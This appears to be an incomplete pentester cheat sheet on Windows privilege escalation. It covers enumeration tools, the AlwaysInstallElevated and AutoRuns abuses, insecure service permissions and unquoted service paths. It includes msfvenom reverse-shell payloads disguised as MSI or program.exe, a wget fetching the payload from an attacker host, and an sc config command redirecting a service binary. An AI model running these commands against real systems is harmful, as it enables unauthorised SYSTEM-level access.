# Windows Privilege Escalation Techniques

## Automated Tools

* **JAWS:** [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)
* **Metasploit:** `multi/recon/local_exploit_suggester`&#x20;
* **PowerUp:** [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* **Windows Exploit Suggester:** [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* **WinPEAS:** [https://github.com/carlospolop/PEASS-ng/releas](https://github.com/carlospolop/PEASS-ng/releases)

**Other Resources**

{% embed url="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters" %}

## Accesschk.exe

`Acesschk.exe` can be used to check what permission a particular user has to services. A wildcard is used to check all services.

```bash
.\accesschk.exe /accepteula -uwcqv "<User>" *

RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```



## Always Install Elevated

Always Install Elevated is a registry / GPO setting that allows non privileged accounts to install Windows Package Installer (MSI) files with SYSTEM permissions. Usually this is used in environments to reduce workload for Helpdesk staff for when users require software to be installed.

Command to query registry keys:

```bash
# Value 0x1 represents AlwaysInstallElevated as being enabled.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![](<.gitbook/assets/image (1743).png>)

WinPEAS can also be used to show this setting as being enabled.

![](<.gitbook/assets/image (1742).png>)

Metasploit can be used to abuse this privilege.

```bash
use exploit/windows/local/always_install_elevated
```

![](<.gitbook/assets/image (1740).png>)

**Msfvenom**

Msfvenom can be used to create a reverse shell disguised as a MSI file. When the file is executed / installed a reverse shell as SYSTEM will be executed.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f msi -o Application.msi
```

Manual install of the MSI file:

![Manual MSI Install](<.gitbook/assets/MSI PrivEsc.png>)

Which returns a SYSTEM shell as shown below.

![](<.gitbook/assets/image (1741).png>)

## AutoRuns

Windows can be set to run scripts and applications on system boot and on logon of a user.&#x20;

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

![](<.gitbook/assets/image (2046).png>)

Above, the binary `program.exe` has been located under the specified registry path. Binaries found in this path are executed every time a user logs into the system. [<mark style="color:red;">\[Source\]</mark>](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)

Running `accesschk.exe` against the binary shows that the security group "Everyone" has _FILE\_ALL\_ACCESS_ permission to the binary.

```
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

![](<.gitbook/assets/image (2040).png>)

This means the binary can be overwritten by anyone. In this effect replacing the binary with a reverse shell of the name `program.exe` would mean the next time someone logs in it would be possible to have the shell executed in the context of the logged in user.

```
# Create Reverse Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o program.exe

# Upload to target system
wget http://<Attacker-IP>/program.exe

# Move to binary folder
move .\program.exe "C:\Program Files\Autorun Program\" /Y

# Wait for user to login
```

## DLL Highjacking

* **DLL Compiler:** `apt install gcc-mingw-w64-x86-64`

## Insecure Service Permissions

Services with Insecure service permissions could allow for privilege escalation. If the current user has the ability to write to or replace the service path binary and, the service is started with privileged permissions such SYSTEM it can be possible to elevate, providing the service is running in.

`Acesschk.exe` can be used to check what permission a particular user has to services. A wildcard is used to check all services.

```bash
.\accesschk.exe /accepteula -uwcqv "<User>" *
```

![](<.gitbook/assets/image (2045).png>)

From the above output _SERVICE\_CHANGE\_CONFIG_ indicates we are able to alter the service configuration and change the binary path.

![](<.gitbook/assets/image (2048).png>)

As from the above value _SERVICE\_START\_NAME_ represents the user in which the service runs under.

The command below can be used to alter the binary to a new, malicious binary.

```bash
sc config daclsvc binpath= "\"C:\PrivEsc\reverse_shell.exe\""
```

Once the binary path has been changed the service can then be started by either using the command below or rebooting the system if permissions allow.

```bash
net start <ServiceName>
```

**Interesting Service permissions**

| Permission              | Description                                          |
| ----------------------- | ---------------------------------------------------- |
| GENERIC\_ALL            | Inherits SERVICE\_CHANGE\_CONFIG                     |
| GENERIC\_WRITE          | Inherits SERVICE\_CHANGE\_CONFIG                     |
| SERVICE\_CHANGE\_CONFIG | Able to alter service binary                         |
| WRITE\_DAC              | Able to alter permissions -> SERVICE\_CHANGE\_CONFIG |
| WRITE\_OWNER            | Able to become owner and change permissions          |

### Metasploit Module

```
use exploit/windows/local/service_permissions
```

## Token Impersonation

## Unquoted Service Paths



The following command can be used to help identify unquoted service paths:

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

**\<WIP>**



